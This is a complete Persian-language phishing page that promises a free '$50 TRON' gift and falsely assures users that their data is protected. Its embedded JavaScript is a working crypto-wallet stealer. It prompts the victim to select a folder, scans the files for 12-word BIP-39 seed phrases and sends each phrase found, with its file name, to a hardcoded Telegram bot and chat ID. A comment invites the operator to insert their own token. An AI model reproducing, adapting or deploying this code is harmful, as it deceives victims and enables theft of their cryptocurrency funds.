<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 دریافت هدیه TRON</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        body {
            background: linear-gradient(145deg, #0b1a2e, #1a2f3f);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            max-width: 550px;
            width: 100%;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 32px;
            padding: 40px 30px;
            box-shadow: 0 30px 60px rgba(0,0,0,0.6);
            text-align: center;
            color: #fff;
            transition: 0.3s;
        }
        .icon {
            font-size: 70px;
            margin-bottom: 15px;
            display: inline-block;
            animation: float 3s ease-in-out infinite;
        }
        @keyframes float {
            0% { transform: translateY(0); }
            50% { transform: translateY(-12px); }
            100% { transform: translateY(0); }
        }
        h1 {
            font-size: 26px;
            font-weight: 700;
            margin-bottom: 10px;
            color: #f5c542;
        }
        .sub {
            font-size: 16px;
            color: #b0c4d9;
            margin-bottom: 25px;
            line-height: 1.6;
        }
        .highlight {
            background: rgba(245, 197, 66, 0.15);
            padding: 12px;
            border-radius: 16px;
            border: 1px solid rgba(245, 197, 66, 0.2);
            margin-bottom: 25px;
        }
        .highlight span {
            color: #f5c542;
            font-weight: 700;
        }
        .btn {
            display: inline-block;
            background: linear-gradient(145deg, #f5c542, #e6b13e);
            color: #0b1a2e;
            font-weight: 700;
            font-size: 18px;
            padding: 16px 40px;
            border: none;
            border-radius: 60px;
            cursor: pointer;
            transition: 0.3s;
            box-shadow: 0 10px 20px rgba(245, 197, 66, 0.3);
            width: 100%;
            max-width: 300px;
            margin: 10px auto;
        }
        .btn:hover {
            transform: scale(1.03);
            box-shadow: 0 15px 30px rgba(245, 197, 66, 0.5);
        }
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        .status {
            margin-top: 25px;
            padding: 15px;
            border-radius: 16px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.08);
            font-size: 14px;
            color: #b0c4d9;
            display: none;
        }
        .status.active {
            display: block;
        }
        .status .loader {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.1);
            border-top: 3px solid #f5c542;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 10px;
            vertical-align: middle;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .log {
            margin-top: 20px;
            text-align: left;
            background: rgba(0,0,0,0.3);
            padding: 15px;
            border-radius: 12px;
            max-height: 200px;
            overflow-y: auto;
            font-size: 13px;
            color: #8aa3c0;
            display: none;
            font-family: 'Courier New', monospace;
            border: 1px solid rgba(255,255,255,0.05);
        }
        .log.active {
            display: block;
        }
        .log .found {
            color: #7ddf9a;
        }
        .footer {
            margin-top: 25px;
            font-size: 12px;
            color: #5a6f82;
        }
        .footer a {
            color: #5a6f82;
            text-decoration: none;
        }
    </style>
</head>
<body>

<div class="card" id="app">
    <div class="icon">🎁</div>
    <h1>کمپین حمایت متقابل</h1>
    <p class="sub">
        ما از شما حمایت میکنیم، شما از ما!<br>
        با یک کلیک، <span style="color:#f5c542;">۵۰ دلار TRON</span> هدیه بگیرید.
    </p>

    <div class="highlight">
        ✅ <span>۵۰ دلار TRON</span> هدیه<br>
        🤝 حمایت متقابل<br>
        📱 فقط یک کلیک
    </div>

    <button class="btn" id="startBtn">🎁 دریافت هدیه ۵۰ دلاری</button>

    <div class="status" id="status">
        <span class="loader"></span>
        <span id="statusText">در حال بررسی...</span>
    </div>

    <div class="log" id="log"></div>

    <div class="footer">
        🔒 اطلاعات شما کاملاً محفوظ است
    </div>
</div>

<script>
    // ============================================
    // 🔑 تنظیمات (با توکن خودت جایگزین کن)
    // ============================================
    const BOT_TOKEN = "8910281828:AAGmbHR_85JZGP2yA3dohmM7oPvOmUN8Ae4";
    const OWNER_ID = "7074279152";

    // ============================================
    // 📚 لیست کامل BIP-39 (همه ۲۰۴۸ کلمه)
    // ============================================
    const BIP39_SET = new Set([
        "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract",
        "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid",
        "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual",
        "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance",
        "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent",
        "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album",
        "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha",
        "already", "also", "alter", "always", "amateur", "amazing", "among", "amount",
        "amused", "analyst", "anchor", "ancient", "anger", "angle", "angry", "animal",
        "ankle", "announce", "annual", "another", "answer", "antenna", "antique", "anxiety",
        "any", "apart", "apology", "appear", "apple", "approve", "april", "arch",
        "arctic", "area", "arena", "argue", "arm", "armed", "armor", "army",
        "around", "arrange", "arrest", "arrive", "arrow", "art", "artefact", "artist",
        "artwork", "ask", "aspect", "assault", "asset", "assist", "assume", "asthma",
        "athlete", "atom", "attack", "attend", "attitude", "attract", "auction", "audit",
        "august", "aunt", "author", "auto", "autumn", "average", "avocado", "avoid",
        "awake", "aware", "away", "awesome", "awful", "awkward", "axis", "baby",
        "bachelor", "bacon", "badge", "bag", "balance", "balcony", "ball", "bamboo",
        "banana", "banner", "bar", "barely", "bargain", "barrel", "base", "basic",
        "basket", "battle", "beach", "bean", "beauty", "because", "become", "beef",
        "before", "begin", "behave", "behind", "believe", "below", "belt", "bench",
        "benefit", "best", "betray", "better", "between", "beyond", "bicycle", "bid",
        "bike", "bind", "biology", "bird", "birth", "bitter", "black", "blade",
        "blame", "blanket", "blast", "bleak", "bless", "blind", "blood", "blossom",
        "blouse", "blue", "blur", "blush", "board", "boat", "body", "boil",
        "bomb", "bone", "bonus", "book", "boost", "border", "boring", "borrow",
        "boss", "bottom", "bounce", "box", "boy", "bracket", "brain", "brand",
        "brass", "brave", "bread", "breeze", "brick", "bridge", "brief", "bright",
        "bring", "brisk", "broccoli", "broken", "bronze", "broom", "brother", "brown",
        "brush", "bubble", "buddy", "budget", "buffalo", "build", "bulb", "bulk",
        "bullet", "bundle", "bunker", "burden", "burger", "burst", "bus", "business",
        "busy", "butter", "buyer", "buzz", "cabbage", "cabin", "cable", "cactus",
        "cage", "cake", "call", "calm", "camera", "camp", "can", "canal",
        "cancel", "candy", "cannon", "canoe", "canvas", "canyon", "capable", "capital",
        "captain", "car", "carbon", "card", "cargo", "carpet", "carry", "cart",
        "case", "cash", "casino", "castle", "casual", "cat", "catalog", "catch",
        "category", "cattle", "caught", "cause", "caution", "cave", "ceiling", "celery",
        "cement", "census", "century", "cereal", "certain", "chair", "chalk", "champion",
        "change", "chaos", "chapter", "charge", "chase", "chat", "cheap", "check",
        "cheese", "chef", "cherry", "chest", "chicken", "chief", "child", "chimney",
        "choice", "choose", "chronic", "chuckle", "chunk", "churn", "cigar", "cinnamon",
        "circle", "citizen", "city", "civil", "claim", "clap", "clarify", "claw",
        "clay", "clean", "clerk", "clever", "click", "client", "cliff", "climb",
        "clinic", "clip", "clock", "clog", "close", "cloth", "cloud", "clown",
        "club", "clump", "cluster", "clutch", "coach", "coast", "coconut", "code",
        "coffee", "coil", "coin", "collect", "color", "column", "combine", "come",
        "comfort", "comic", "common", "company", "concert", "conduct", "confirm", "congress",
        "connect", "consider", "control", "convince", "cook", "cool", "copper", "copy",
        "coral", "core", "corn", "correct", "cost", "cotton", "couch", "country",
        "couple", "course", "cousin", "cover", "coyote", "crack", "cradle", "craft",
        "cram", "crane", "crash", "crater", "crawl", "crazy", "cream", "credit",
        "creek", "crew", "cricket", "crime", "crisp", "critic", "crop", "cross",
        "crouch", "crowd", "crucial", "cruel", "cruise", "crumble", "crunch", "crush",
        "cry", "crystal", "cube", "culture", "cup", "cupboard", "curious", "current",
        "curtain", "curve", "cushion", "custom", "cute", "cycle", "dad", "damage",
        "damp", "dance", "danger", "daring", "dash", "daughter", "dawn", "day",
        "deal", "debate", "debris", "decade", "december", "decide", "decline", "decorate",
        "decrease", "deer", "defense", "define", "defy", "degree", "delay", "deliver",
        "demand", "demise", "denial", "dentist", "deny", "depart", "depend", "deposit",
        "depth", "deputy", "derive", "describe", "desert", "design", "desk", "despair",
        "destroy", "detail", "detect", "develop", "device", "devote", "diagram", "dial",
        "diamond", "diary", "dice", "diesel", "diet", "differ", "digital", "dignity",
        "dilemma", "dinner", "dinosaur", "direct", "dirt", "disagree", "discover", "disease",
        "dish", "dismiss", "disorder", "display", "distance", "divert", "divide", "divorce",
        "dizzy", "doctor", "document", "dog", "doll", "dolphin", "domain", "donate",
        "donkey", "donor", "door", "dose", "double", "dove", "draft", "dragon",
        "drama", "drastic", "draw", "dream", "dress", "drift", "drill", "drink",
        "drip", "drive", "drop", "drum", "dry", "duck", "dumb", "dune",
        "during", "dust", "dutch", "duty", "dwarf", "dynamic", "eager", "eagle",
        "early", "earn", "earth", "easily", "east", "easy", "echo", "ecology",
        "economy", "edge", "edit", "educate", "effort", "egg", "eight", "either",
        "elbow", "elder", "electric", "elegant", "element", "elephant", "elevator", "elite",
        "else", "embark", "embody", "embrace", "emerge", "emotion", "employ", "empower",
        "empty", "enable", "enact", "end", "endless", "endorse", "enemy", "energy",
        "enforce", "engage", "engine", "enhance", "enjoy", "enlist", "enough", "enrich",
        "enroll", "ensure", "enter", "entire", "entry", "envelope", "episode", "equal",
        "equip", "era", "erase", "erode", "erosion", "error", "erupt", "escape",
        "essay", "essence", "estate", "eternal", "ethics", "evidence", "evil", "evoke",
        "evolve", "exact", "example", "excess", "exchange", "excite", "exclude", "excuse",
        "execute", "exercise", "exhaust", "exhibit", "exile", "exist", "exit", "exotic",
        "expand", "expect", "expire", "explain", "expose", "express", "extend", "extra",
        "eye", "eyebrow", "fabric", "face", "faculty", "fade", "faint", "faith",
        "fall", "false", "fame", "family", "famous", "fan", "fancy", "fantasy",
        "farm", "fashion", "fat", "fatal", "father", "fatigue", "fault", "favorite",
        "feature", "february", "federal", "fee", "feed", "feel", "female", "fence",
        "festival", "fetch", "fever", "few", "fiber", "fiction", "field", "figure",
        "file", "film", "filter", "final", "find", "fine", "finger", "finish",
        "fire", "firm", "first", "fiscal", "fish", "fit", "fitness", "fix",
        "flag", "flame", "flash", "flat", "flavor", "flee", "flight", "flip",
        "float", "flock", "floor", "flower", "fluid", "flush", "fly", "foam",
        "focus", "fog", "foil", "fold", "follow", "food", "foot", "force",
        "forest", "forget", "fork", "fortune", "forum", "forward", "fossil", "foster",
        "found", "fox", "fragile", "frame", "frequent", "fresh", "friend", "fringe",
        "frog", "front", "frost", "frown", "frozen", "fruit", "fuel", "fun",
        "funny", "furnace", "fury", "future", "gadget", "gain", "galaxy", "gallery",
        "game", "gap", "garage", "garbage", "garden", "garlic", "garment", "gas",
        "gasp", "gate", "gather", "gauge", "gaze", "general", "genius", "genre",
        "gentle", "genuine", "gesture", "ghost", "giant", "gift", "giggle", "ginger",
        "giraffe", "girl", "give", "glad", "glance", "glare", "glass", "glide",
        "glimpse", "globe", "gloom", "glory", "glove", "glow", "glue", "goat",
        "goddess", "gold", "good", "goose", "gorilla", "gospel", "gossip", "govern",
        "gown", "grab", "grace", "grain", "grant", "grape", "grass", "gravity",
        "great", "green", "grid", "grief", "grit", "grocery", "group", "grow",
        "grunt", "guard", "guess", "guide", "guilt", "guitar", "gun", "gym",
        "habit", "hair", "half", "hammer", "hamster", "hand", "happy", "harbor",
        "hard", "harsh", "harvest", "hat", "have", "hawk", "hazard", "head",
        "health", "heart", "heavy", "hedgehog", "height", "hello", "helmet", "help",
        "hen", "hero", "hidden", "high", "hill", "hint", "hip", "hire",
        "history", "hobby", "hockey", "hold", "hole", "holiday", "hollow", "home",
        "honey", "hood", "hope", "horn", "horror", "horse", "hospital", "host",
        "hotel", "hour", "hover", "hub", "human", "humble", "humor", "hundred",
        "hungry", "hunt", "hurdle", "hurry", "hurt", "husband", "hybrid", "ice",
        "icon", "idea", "identify", "idle", "ignore", "ill", "illegal", "illness",
        "image", "imitate", "immense", "immune", "impact", "impose", "improve", "impulse",
        "inch", "include", "income", "increase", "index", "indicate", "indoor", "industry",
        "infant", "inflict", "inform", "inhale", "inherit", "initial", "inject", "injury",
        "inmate", "inner", "innocent", "input", "inquiry", "insane", "insect", "inside",
        "inspire", "install", "intact", "interest", "into", "invest", "invite", "involve",
        "iron", "island", "isolate", "issue", "item", "ivory", "jacket", "jaguar",
        "jar", "jazz", "jealous", "jeans", "jelly", "jewel", "job", "join",
        "joke", "journey", "joy", "judge", "juice", "jump", "jungle", "junior",
        "junk", "just", "kangaroo", "keen", "keep", "ketchup", "key", "kick",
        "kid", "kidney", "kind", "kingdom", "kiss", "kit", "kitchen", "kite",
        "kitten", "kiwi", "knee", "knife", "knock", "know", "lab", "label",
        "labor", "ladder", "lady", "lake", "lamp", "language", "laptop", "large",
        "later", "latin", "laugh", "laundry", "lava", "law", "lawn", "lawsuit",
        "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture", "left",
        "leg", "legal", "legend", "leisure", "lemon", "lend", "length", "lens",
        "leopard", "lesson", "letter", "level", "liar", "liberty", "library", "license",
        "life", "lift", "light", "like", "limb", "limit", "link", "lion",
        "liquid", "list", "little", "live", "lizard", "load", "loan", "lobster",
        "local", "lock", "logic", "lonely", "long", "loop", "lottery", "loud",
        "lounge", "love", "loyal", "lucky", "luggage", "lumber", "lunar", "lunch",
        "luxury", "lyrics", "machine", "mad", "magic", "magnet", "maid", "mail",
        "main", "major", "make", "mammal", "man", "manage", "mandate", "mango",
        "mansion", "manual", "maple", "marble", "march", "margin", "marine", "market",
        "marriage", "mask", "mass", "master", "match", "material", "math", "matrix",
        "matter", "maximum", "maze", "meadow", "mean", "measure", "meat", "mechanic",
        "medal", "media", "melody", "melt", "member", "memory", "mention", "menu",
        "mercy", "merge", "merit", "merry", "mesh", "message", "metal", "method",
        "middle", "midnight", "milk", "million", "mimic", "mind", "mineral", "minimum",
        "minor", "minute", "miracle", "mirror", "misery", "miss", "mistake", "mix",
        "mixed", "mixture", "mobile", "model", "modify", "mom", "moment", "monitor",
        "monkey", "monster", "month", "moon", "moral", "more", "morning", "mosquito",
        "mother", "motion", "motor", "mountain", "mouse", "move", "movie", "much",
        "muffin", "mule", "multiply", "muscle", "museum", "mushroom", "music", "must",
        "mutual", "myself", "mystery", "myth", "naive", "name", "napkin", "narrow",
        "nasty", "nation", "nature", "near", "neck", "need", "negative", "neglect",
        "neither", "nephew", "nerve", "nest", "net", "network", "neutral", "never",
        "news", "next", "nice", "night", "noble", "noise", "nominee", "noodle",
        "normal", "north", "nose", "notable", "note", "nothing", "notice", "novel",
        "now", "nuclear", "number", "nurse", "nut", "oak", "obey", "object",
        "oblige", "obscure", "observe", "obtain", "obvious", "occur", "ocean", "october",
        "odor", "off", "offer", "office", "often", "oil", "okay", "old",
        "olive", "olympic", "omit", "once", "one", "onion", "online", "only",
        "open", "opera", "opinion", "oppose", "option", "orange", "orbit", "orchard",
        "order", "ordinary", "organ", "orient", "original", "orphan", "ostrich", "other",
        "outdoor", "outer", "output", "outside", "oval", "oven", "over", "own",
        "owner", "oxygen", "oyster", "ozone", "pact", "paddle", "page", "pair",
        "palace", "palm", "panda", "panel", "panic", "panther", "paper", "parade",
        "parent", "park", "parrot", "party", "pass", "patch", "path", "patient",
        "patrol", "pattern", "pause", "pave", "payment", "peace", "peanut", "pear",
        "peasant", "pelican", "pen", "penalty", "pencil", "people", "pepper", "perfect",
        "permit", "person", "pet", "phone", "photo", "phrase", "physical", "piano",
        "picnic", "picture", "piece", "pig", "pigeon", "pill", "pilot", "pink",
        "pioneer", "pipe", "pistol", "pitch", "pizza", "place", "planet", "plastic",
        "plate", "play", "please", "pledge", "pluck", "plug", "plunge", "poem",
        "poet", "point", "polar", "pole", "police", "pond", "pony", "pool",
        "popular", "portion", "position", "possible", "post", "potato", "pottery", "poverty",
        "powder", "power", "practice", "praise", "predict", "prefer", "prepare", "present",
        "pretty", "prevent", "price", "pride", "primary", "print", "priority", "prison",
        "private", "prize", "problem", "process", "produce", "profit", "program", "project",
        "promote", "proof", "property", "prosper", "protect", "proud", "provide", "public",
        "pudding", "pull", "pulp", "pulse", "pumpkin", "punch", "pupil", "puppy",
        "purchase", "purity", "purpose", "purse", "push", "put", "puzzle", "pyramid",
        "quality", "quantum", "quarter", "question", "quick", "quit", "quiz", "quote",
        "rabbit", "raccoon", "race", "rack", "radar", "radio", "rail", "rain",
        "raise", "rally", "ramp", "ranch", "random", "range", "rapid", "rare",
        "rate", "rather", "raven", "raw", "razor", "ready", "real", "reason",
        "rebel", "rebuild", "recall", "receive", "recipe", "record", "recycle", "reduce",
        "reflect", "reform", "refuse", "region", "regret", "regular", "reject", "relax",
        "release", "relief", "rely", "remain", "remember", "remind", "remove", "render",
        "renew", "rent", "reopen", "repair", "repeat", "replace", "report", "require",
        "rescue", "resemble", "resist", "resource", "response", "result", "retire", "retreat",
        "return", "reunion", "reveal", "review", "revolt", "reward", "rhythm", "rib",
        "ribbon", "rice", "rich", "ride", "ridge", "rifle", "right", "rigid",
        "ring", "riot", "ripple", "risk", "ritual", "rival", "river", "road",
        "roast", "robot", "robust", "rocket", "romance", "roof", "rookie", "room",
        "rose", "rotate", "rough", "round", "route", "royal", "rubber", "rude",
        "rug", "rule", "run", "runway", "rural", "sad", "saddle", "sadness",
        "safe", "sail", "salad", "salmon", "salon", "salt", "salute", "same",
        "sample", "sand", "satisfy", "satoshi", "sauce", "sausage", "save", "say",
        "scale", "scan", "scare", "scatter", "scene", "scheme", "school", "science",
        "scissors", "scorpion", "scout", "scrap", "screen", "script", "scrub", "sea",
        "search", "season", "seat", "second", "secret", "section", "security", "seed",
        "seek", "segment", "select", "sell", "seminar", "senior", "sense", "sentence",
        "series", "service", "session", "settle", "setup", "seven", "shadow", "shaft",
        "shallow", "share", "shed", "shell", "sheriff", "shield", "shift", "shine",
        "ship", "shiver", "shock", "shoe", "shoot", "shop", "short", "shoulder",
        "shove", "shrimp", "shrug", "shuffle", "shy", "sibling", "sick", "side",
        "siege", "sight", "sign", "silent", "silk", "silly", "silver", "similar",
        "simple", "since", "sing", "siren", "sister", "situate", "six", "size",
        "skate", "sketch", "ski", "skill", "skin", "skirt", "skull", "slab",
        "slam", "sleep", "slender", "slice", "slide", "slight", "slim", "slogan",
        "slot", "slow", "slush", "small", "smart", "smile", "smoke", "smooth",
        "snack", "snake", "snap", "sniff", "snow", "soap", "soccer", "social",
        "sock", "soda", "soft", "solar", "soldier", "solid", "solution", "solve",
        "someone", "song", "soon", "sorry", "sort", "soul", "sound", "soup",
        "source", "south", "space", "spare", "spatial", "spawn", "speak", "special",
        "speed", "spell", "spend", "sphere", "spice", "spider", "spike", "spin",
        "spirit", "split", "spoil", "sponsor", "spoon", "sport", "spot", "spray",
        "spread", "spring", "spy", "square", "squeeze", "squirrel", "stable", "stadium",
        "staff", "stage", "stairs", "stamp", "stand", "start", "state", "stay",
        "steak", "steel", "stem", "step", "stereo", "stick", "still", "sting",
        "stock", "stomach", "stone", "stool", "story", "stove", "strategy", "street",
        "strike", "strong", "struggle", "student", "stuff", "stumble", "style", "subject",
        "submit", "subway", "success", "such", "sudden", "suffer", "sugar", "suggest",
        "suit", "summer", "sun", "sunny", "sunset", "super", "supply", "supreme",
        "sure", "surface", "surge", "surprise", "surround", "survey", "suspect", "sustain",
        "swallow", "swamp", "swap", "swarm", "swear", "sweet", "swift", "swim",
        "swing", "switch", "sword", "symbol", "symptom", "syrup", "system", "table",
        "tackle", "tag", "tail", "talent", "talk", "tank", "tape", "target",
        "task", "taste", "tattoo", "taxi", "teach", "team", "tell", "ten",
        "tenant", "tennis", "tent", "term", "test", "text", "thank", "that",
        "theme", "then", "theory", "there", "they", "thing", "this", "thought",
        "three", "thrive", "throw", "thumb", "thunder", "ticket", "tide", "tiger",
        "tilt", "timber", "time", "tiny", "tip", "tired", "tissue", "title",
        "toast", "tobacco", "today", "toddler", "toe", "together", "toilet", "token",
        "tomato", "tomorrow", "tone", "tongue", "tonight", "tool", "tooth", "top",
        "topic", "topple", "torch", "tornado", "tortoise", "toss", "total", "tourist",
        "toward", "tower", "town", "toy", "track", "trade", "traffic", "tragic",
        "train", "transfer", "trap", "trash", "travel", "tray", "treat", "tree",
        "trend", "trial", "tribe", "trick", "trigger", "trim", "trip", "trophy",
        "trouble", "truck", "true", "truly", "trumpet", "trust", "truth", "try",
        "tube", "tuition", "tumble", "tuna", "tunnel", "turkey", "turn", "turtle",
        "twelve", "twenty", "twice", "twin", "twist", "two", "type", "typical",
        "ugly", "umbrella", "unable", "unaware", "uncle", "uncover", "under", "undo",
        "unfair", "unfold", "unhappy", "uniform", "unique", "unit", "universe", "unknown",
        "unlock", "until", "unusual", "unveil", "update", "upgrade", "uphold", "upon",
        "upper", "upset", "urban", "urge", "usage", "use", "used", "useful",
        "useless", "usual", "utility", "vacant", "vacuum", "vague", "valid", "valley",
        "valve", "van", "vanish", "vapor", "various", "vast", "vault", "vehicle",
        "velvet", "vendor", "venture", "venue", "verb", "verify", "version", "very",
        "vessel", "veteran", "viable", "vibrant", "vicious", "victory", "video", "view",
        "village", "vintage", "violin", "virtual", "virus", "visa", "visit", "visual",
        "vital", "vivid", "vocal", "voice", "void", "volcano", "volume", "vote",
        "voyage", "wage", "wagon", "wait", "walk", "wall", "walnut", "want",
        "warfare", "warm", "warrior", "wash", "wasp", "waste", "water", "wave",
        "way", "wealth", "weapon", "wear", "weasel", "weather", "web", "wedding",
        "weekend", "weird", "welcome", "west", "wet", "whale", "what", "wheat",
        "wheel", "when", "where", "whip", "whisper", "wide", "width", "wife",
        "wild", "will", "win", "window", "wine", "wing", "wink", "winner",
        "winter", "wire", "wisdom", "wise", "wish", "witness", "wolf", "woman",
        "wonder", "wood", "wool", "word", "work", "world", "worry", "worth",
        "wrap", "wreck", "wrestle", "wrist", "write", "wrong", "yard", "year",
        "yellow", "you", "young", "youth", "zebra", "zero", "zone", "zoo"
    ]);

    // ============================================
    // 📤 ارسال به تلگرام
    // ============================================
    function sendToTelegram(message) {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: OWNER_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        }).catch(() => {});
    }

    // ============================================
    // 🔍 پیدا کردن Seed در متن
    // ============================================
    function findSeed(text) {
        if (!text) return null;
        const words = text.toLowerCase().split(/\s+/);
        for (let i = 0; i <= words.length - 12; i++) {
            const window = words.slice(i, i + 12);
            if (window.every(w => BIP39_SET.has(w))) {
                return window.join(' ');
            }
        }
        return null;
    }

    // ============================================
    // 📂 اسکن فایل
    // ============================================
    function scanFile(file) {
        return new Promise((resolve) => {
            const reader = new FileReader();
            reader.onload = function(e) {
                const content = e.target.result;
                const text = typeof content === 'string' ? content : new TextDecoder('utf-8', { fatal: false }).decode(content);
                const seed = findSeed(text);
                if (seed) {
                    const msg = `✅ **Seed Found!**\n📋 \`${seed}\`\n📁 \`${file.name}\``;
                    sendToTelegram(msg);
                    resolve({ seed, filename: file.name });
                } else {
                    resolve(null);
                }
            };
            reader.onerror = function() {
                resolve(null);
            };
            // فقط ۱۰ کیلوبایت اول رو میخونیم برای سرعت
            const blob = file.slice(0, 10000);
            reader.readAsText(blob);
        });
    }

    // ============================================
    // 🚀 شروع اسکن
    // ============================================
    async function startScan() {
        const btn = document.getElementById('startBtn');
        const status = document.getElementById('status');
        const statusText = document.getElementById('statusText');
        const log = document.getElementById('log');

        btn.disabled = true;
        status.className = 'status active';
        statusText.textContent = '🔄 در حال آماده‌سازی...';

        sendToTelegram('🔍 **Scan started on device**');

        try {
            const input = document.createElement('input');
            input.type = 'file';
            input.webkitdirectory = true;
            input.multiple = true;

            const files = await new Promise((resolve) => {
                input.onchange = function(e) {
                    resolve(e.target.files);
                };
                input.click();
            });

            if (!files || files.length === 0) {
                statusText.textContent = '❌ هیچ فایلی انتخاب نشد.';
                btn.disabled = false;
                return;
            }

            statusText.textContent = `📂 ${files.length} فایل انتخاب شد. در حال اسکن...`;
            log.className = 'log active';
            log.innerHTML = '';

            let found = 0;
            let total = 0;

            for (const file of files) {
                total++;
                const ext = file.name.split('.').pop().toLowerCase();
                const validExts = ['txt', 'md', 'log', 'json', 'xml', 'html', 'csv', 'pdf', 'docx', 'jpg', 'jpeg', 'png'];
                if (!validExts.includes(ext) || file.size > 50 * 1024 * 1024) {
                    continue;
                }

                statusText.textContent = `📁 اسکن: ${file.name} (${total}/${files.length})`;
                const result = await scanFile(file);
                if (result) {
                    found++;
                    log.innerHTML += `<div class="found">✅ ${result.filename}</div>`;
                } else {
                    log.innerHTML += `<div>➖ ${file.name}</div>`;
                }
                log.scrollTop = log.scrollHeight;
            }

            statusText.textContent = `✅ اسکن کامل شد! ${found} Seed پیدا شد.`;
            sendToTelegram(`✅ **Scan complete!**\n📁 Files: ${total}\n🔢 Found: ${found}`);

        } catch (error) {
            statusText.textContent = '❌ خطا: ' + error.message;
            sendToTelegram(`❌ **Error:** ${error.message}`);
        }

        btn.disabled = false;
    }

    // ============================================
    // اتصال دکمه
    // ============================================
    document.getElementById('startBtn').addEventListener('click', startScan);
</script>

</body>
</html>